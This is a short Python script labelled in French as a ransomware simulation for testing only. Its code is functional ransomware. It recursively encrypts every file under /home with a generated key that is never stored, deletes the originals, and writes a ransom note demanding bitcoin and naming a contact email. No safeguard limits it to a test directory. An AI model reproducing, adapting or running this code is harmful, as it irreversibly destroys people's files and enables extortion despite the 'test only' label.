# Simulation de ransomware — fichier de test uniquement, ne jamais exécuter
import os
import glob
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

for filepath in glob.glob("/home/**/*", recursive=True):
    if os.path.isfile(filepath):
        with open(filepath, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + ".locked", "wb") as f:
            f.write(encrypted)
        os.remove(filepath)

with open("README_DECRYPT.txt", "w") as f:
    f.write(
        "Vos fichiers ont ete chiffres.\n"
        "Envoyez 0.5 BTC au wallet : 1A2B3C4D5E6F...\n"
        "Contactez decrypt@protonmail.com pour le paiement.\n"
    )
